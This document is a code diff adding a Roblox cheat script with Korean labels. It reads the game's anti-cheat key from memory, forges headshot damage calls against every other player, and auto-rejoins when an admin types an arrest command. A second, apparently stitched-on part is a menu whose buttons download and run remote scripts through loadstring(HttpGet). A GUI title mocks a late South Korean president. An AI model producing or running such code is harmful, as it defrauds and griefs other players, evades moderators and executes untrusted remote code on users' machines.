+ImageLabel.Draggable = true
+ImageLabel.Selectable = true
+
+TextButton.Parent = ImageLabel
+TextButton.BackgroundColor3 = Color3.fromRGB(33, 33, 33)
+TextButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextButton.Position = UDim2.new(0.189006761, 0, 0.733144403, 0)
+TextButton.Size = UDim2.new(0, 186, 0, 62)
+TextButton.Font = Enum.Font.Garamond
+TextButton.Text = "발작버튼"
+TextButton.TextColor3 = Color3.fromRGB(255, 0, 0)
+TextButton.TextSize = 30.000
+TextButton.TextWrapped = true
+
+CaveArmy.Name = "CaveArmy"
+CaveArmy.Parent = ImageLabel
+CaveArmy.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CaveArmy.BackgroundTransparency = 1.000
+CaveArmy.BorderColor3 = Color3.fromRGB(255, 255, 255)
+CaveArmy.BorderSizePixel = 3
+CaveArmy.Position = UDim2.new(-0.0021844483, 0, -0.00223904685, 0)
+CaveArmy.Size = UDim2.new(0, 77, 0, 20)
+CaveArmy.Font = Enum.Font.Code
+CaveArmy.Text = "노무현 허브"
+CaveArmy.TextColor3 = Color3.fromRGB(255, 0, 0)
+CaveArmy.TextScaled = true
+CaveArmy.TextSize = 14.000
+CaveArmy.TextWrapped = true
+
+local player = game.Players.LocalPlayer
+
+-- 안전하게 Info 인스턴스 찾기
+local info = player:FindFirstChild("Info", true)
+if info and info.Parent then
+	local tool = info.Parent
+	local char = player.Character
+	local humanoid = char and char:FindFirstChildOfClass("Humanoid")
+
+	if humanoid and tool:IsA("Tool") then
+		repeat
+			local success, err = pcall(function()
+				humanoid:EquipTool(tool)
+			end)
+			if not success then
+			end
+			wait(0.1)
+		until char and char:FindFirstChild(tool.Name)
+		KeyTable = {}
+		retrieved = filtergc("table", { Keys = { "remote_key" }, }, true)
+		if retrieved then
+			KeyTable = retrieved.remote_key
+		end
+
+		remote_key = {}
+	elseif  player.Character:FindFirstChild("Info",true).Parent then
+		return true
+	end
+else
+	print("총을 찾을 수 없습니다.")
+	return false
+end
+
+PlaceId, JobId = game.PlaceId, game.JobId
+local Players = game.Players
+local TeleportService = game:GetService("TeleportService")
+
+for i, plr in pairs(game.Players:GetPlayers()) do
+	plr.Chatted:Connect(function(msg)
+		local command, targetName = msg:match("^[:;](%S+)%s+(%S+)")
+		if command and (command == "영창" or command == "arrest") then
+			for i, target in pairs(game.Players:GetPlayers()) do
+				if string.find(target.Name:lower(), targetName:lower(), 1, true) then
+					if #Players:GetPlayers() <= 1 then
+						Players.LocalPlayer:Kick("\nRejoining...")
+						wait()
+						TeleportService:Teleport(PlaceId, Players.LocalPlayer)
+					else
+						TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Players.LocalPlayer)
+					end
+				end
+			end
+		end
+	end)
+end
+
+game.Players.PlayerAdded:Connect(function(plr)
+	plr.Chatted:Connect(function(msg)
+		local command, targetName = msg:match("^:(%S+)%s+(%S+)")
+		if command and (command == "영창" or command == "arrest") then
+			for i, target in pairs(game.Players:GetPlayers()) do
+				if string.find(target.Name:lower(), targetName:lower(), 1, true) then
+					if #Players:GetPlayers() <= 1 then
+						Players.LocalPlayer:Kick("\nRejoining...")
+						wait()
+						TeleportService:Teleport(PlaceId, Players.LocalPlayer)
+					else
+						TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Players.LocalPlayer)
+					end
+				end
+			end
+		end
+	end)
+end)
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+
+local DamageRemote = ReplicatedStorage:WaitForChild("Assets"):WaitForChild("Misc")
+	:WaitForChild("CWS_Directory"):WaitForChild("remotes"):WaitForChild("Damage")
+
+function Notification(Title,text)
+	local CoreGui = game:GetService("StarterGui")
+	CoreGui:SetCore("SendNotification", {
+		Title = Title;
+		Text = text;
+	})
+end
+
+Notification("작동법","툴을 장착하고 버튼을 클릭하여 사람들을 죽이세요")
+
+
+
+local function ReplaceChar(pos, str, r)
+	return str:sub(1, pos-1) .. r .. str:sub(pos+1)
+end
+
+local function GetPlayerUserId(Player)
+	local user_id = Player.UserId
+	if #tostring(user_id) ~= 9 then
+		user_id = math.abs(user_id * 100000000)
+	end
+	return user_id
+end
+
+local function NextRemoteKey(Player)
+	local user_id = GetPlayerUserId(Player)
+	local key = remote_key[user_id]
+	if not key then return nil end
+
+	local a = key:sub(4,4)
+	local p = string.byte(key:sub(1,1))
+	local s = tonumber(a) + tonumber(a)
+	if s > 9 then s = 1 end
+	local n = key:gsub(a, tostring(s))
+	local h = p + 4 - s
+	if h > 90 then h = 65 end
+	local n1 = ReplaceChar(1, n, string.char(h))
+	remote_key[user_id] = n1
+
+	return n1
+end
+
+local userid = GetPlayerUserId(player)
+
+do
+	local initial
+	for _, v in pairs(KeyTable) do
+		initial = v
+		break
+	end
+	remote_key[userid] = initial
+end
+
+local function getTool()
+	for i, v in pairs(game.Players:GetPlayers()) do
+		if v ==game.Players.LocalPlayer and v.Character:FindFirstChild("Info",true).Parent then
+			return v.Character:FindFirstChild("Info",true).Parent
+		end
+	end
+end
+
+local function isTargetValid(targetPlayer)
+	if not targetPlayer or targetPlayer == player then return false end
+	local char = targetPlayer.Character
+	if not char or not char.Parent then return false end
+	local humanoid = char:FindFirstChildOfClass("Humanoid")
+	if not humanoid or humanoid.Health <= 0 then return false end
+	return true
+end
+
+local function ByPassKey(k, targetPlayer)
+	if not k then return end
+	if not isTargetValid(targetPlayer) then return end
+
+	local humanoid = targetPlayer.Character:FindFirstChild("Humanoid")
+	local tool = getTool()
+	if not tool then return end
+
+	local Info
+	local ok, result = pcall(require, tool.Info)
+	if ok then
+		Info = result
+	else
+		return
+	end
+
+	local args = {
+		[1] = {
+			["damage"] = Info.damage.headshot,
+			["k"] = k,
+			["hit_name"] = "Head",
+			["target"] = humanoid,
+			["velocity"] = Vector3.new(0,0,0),
+			["tool"] = tool,
+			["auth"] = false
+		}
+	}
+
+	pcall(function()
+		DamageRemote:FireServer(unpack(args))
+	end)
+end
+
+local queue = {}
+local processing = false
+local debounce = false
+
+local PROCESS_INTERVAL = 0.08
+local BURST_SIZE = 3
+
+local function enqueueTargets()
+	table.clear(queue)
+	for _, v in pairs(Players:GetPlayers()) do
+		if v ~= player and isTargetValid(v) then
+			table.insert(queue, v)
+		end
+	end
+end
+
+local function processQueue()
+	if processing then return end
+	processing = true
+	debounce = true
+
+	task.spawn(function()
+		local idx = 1
+		while idx <= #queue do
+			local processedThisTick = 0
+
+			while processedThisTick < BURST_SIZE and idx <= #queue do
+				local target = queue[idx]
+
+				if isTargetValid(target) then
+					local k = NextRemoteKey(player)
+					if k then
+						ByPassKey(k, target)
+					end
+				end
+
+				idx += 1
+				processedThisTick += 1
+			end
+		end
+
+		processing = false
+		debounce = false
+	end)
+end
+
+TextButton.MouseButton1Click:Connect(function()
+	for i=1, 60 do
+		if debounce then
+			return
+		end
+
+		if not getTool() then
+			return
+		end
+
+		if not remote_key[userid] then
+			return
+		end
+
+		enqueueTargets()
+
+		if #queue > 0 then
+			processQueue()
+		end
+	end
+end)
+   end, 
+})    
+    
+local Tab = Window:CreateTab("블레이드 피구⚔️", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+local Button = Tab:CreateButton({
+   Name = "블피-키-vortex42244",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Jayson24244/Vortex/refs/heads/main/Bloxfruit", true))()
+   end, 
+})
+
+local Button = Tab:CreateButton({
+   Name = "오토팜가능",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/CheemsNhuChiAl/Sotringhuhu/main/StrawberryHubBeta1.35"))()
+   end, 
+})
+
+local Button = Tab:CreateButton({
+   Name = "헙",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))()
+   end, 
+})
+
+local Button = Tab:CreateButton({
+   Name = "레벨업",
+   Callback = function()
+   loadstring(game:HttpGet("https://bonkhubloader.netlify.app",true))()
+   end, 
+})
+
+local Tab = Window:CreateTab("머더2❤️", nil) -- Title, Image
+local Section = Tab:CreateSection("메인")
+
+local Button = Tab:CreateButton({
+   Name = "머더2",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
+   end, 
+})
+
+local Button = Tab:CreateButton({
+   Name = "Yousuck780",
+   Callback = function()
+   loadstring(game:HttpGet(("https://raw.githubusercontent.com/Yousuck780/mm2/main/mm2"), true))()
+   end, 
+})
